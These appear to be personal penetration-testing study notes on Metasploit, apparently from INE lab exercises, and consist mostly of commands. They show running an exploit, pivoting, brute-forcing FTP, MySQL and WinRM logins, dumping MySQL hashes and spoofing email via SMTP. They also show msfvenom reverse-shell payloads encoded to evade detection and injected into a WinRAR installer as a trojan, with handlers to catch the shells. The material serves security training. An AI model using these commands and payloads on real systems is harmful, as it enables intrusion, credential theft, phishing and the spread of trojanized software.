<h1>Metasploit Fundamentals</h1>

Initialisation of database
```
sudo systemctl start postgresql
```

```
sudo msfdb init
sudo msfdb reinit
sudo msfdb status
```
In meterpreter
```
search type:exploits platform:windows
```

```
workspace -h
hosts
workspace -a Testspace
workspace
hosts
workspace default
workspace -d Testspace
workspace -a Moew
workspace -r Moew Meow
```

<h2>T1046:Network Service Scanning </h2>
```
msfconsole
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```

```
shell
ip addr
```

```
run autoroute -s <attackerIP>
```

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```

```
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

bash-port-scanner.sh
```
#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

```
sessions -i 1
```

```
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

we have uploaded nmap and our bash-port-scanner.sh to run in the target machine.

<h2>FTP</h2>
To perform file brute-force attacks on the web server?
```
auxililary/scanner/http/files_dir
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/ftp/anonymous
```

<h2>SQL</h2>
 MySQL auxiliary module can be used to execute authenticated SQL queries on a MySQL database server?
 ```
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_writable_dirs
 ```

<h2>SMTP</h2>
```
nmap -sV -script banner demo.ine.local
```

```
nc demo.ine.local 25
```
```
VRFY admin@openmailbox.xyz
```

```
telnet demo.ine.local 25
HELO attacker.xyz
EHLO attacker.xyz
```

```
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
```

```
msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS demo.ine.local
exploit
```

```
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

```
sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```



MSFconsole search queries can be used to search for specific CVE's released in a specific year?
```
search cve:2017 platform:windows
```

<h1>Vulnerability Scanning</h1>
<h2>MSF</h2>

```
sudo service postgresql start && msfconsole
workspace -a nmap
db_nmap -Pn -sS -sV -O demo.ine.local
hosts
services
search type:exploit name: 
analyse
vulns
load db_autopwn
```

<h2> Nessus </h2>

<h2>WMAP</h2>
```
wmap_sites -a demo.ine.local
wmap_targets -h
wmap_targets -t http://demo.ine.local
wmap_sites -l
wmap_targets -l
wmap_run -h
wmap_run -t

```

<h1>Client-Side attacks</h1>
<h2>Msfvenom</h2>
```
msfvenom --list payloads
```

```
	<operatingSystem>/<OsArchitectureBit>/<PayloadType>/<Protocol>
```

```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > /home/kali/meow.exe
```

```
msfvenom --list formats
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > /home/kali/meow_x86
```

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT= -f elf > /home/kali/meow_x64
```

```
msfconsole
use exploit/multi/handler
show options
set payload 
set LHOST
set LPORT
```

ENCODING 

`shellcode` is a piece of code that is typically used as a payload for exploitation


```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -f exe > /home/kali/enocde/meowEncodeed.exe
```

increasing iterations will reduce the chances of detection

```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/enocde/meowEncodeed.exe
```

```
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/ecode/meow
```

Windows portable executable 

google: winrar and download it /Download/winrar.exe

generate a 32 bit executable payload and inject it into winrar

```
	msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar.exe > /home/kali/enocde/meowEncodeed.exe
```
this file above is not executable
	Migrate : meterpreter> run post/windows/manager/migrate
to avoid detection

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -e x86/shikata_ga_nai -f exe -x ~/Downloads/winrar.exe > /home/kali/enocde/meowEncodeed.exe
```
this file above is executable

Automation of commands in msfconsole

```
vim handler.rc
`
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 
set LPORT 
run
`
msfconsole -r handler.rc
```

```
vim portscanner.rc
`
use auxiliary/scanner/portscan/tcp
set RHOST
set LHOST
run
`
```

```
vim db_status.rc
`
db_status
workspace 
workspace -a Meow
`
```

to Load resource into mf6>
```
resouce hanler.rc
```

to Explort the previously typed commands in msf6
```
makerc /meowmeoew/meow.rc
```

<h2>WinRm</h2>
<i>Port Number: 5985 TCP 5986 https</i>
```
use auxiliary/scanner/winrm/winrm_wql
setg RHOSTS 

use auxiliary/scanner/winrm/winrm_login
set USER_FILE
set PASS_FILE

use auxiliary/scanner/winrm/winrm_cmd
set USERNAME
set PASSWORD
set CMD

use auxiliary/scanner/winrm/winrm_script_exec
set USERNAME
set PASSWORD
set FORCE_VBS true
```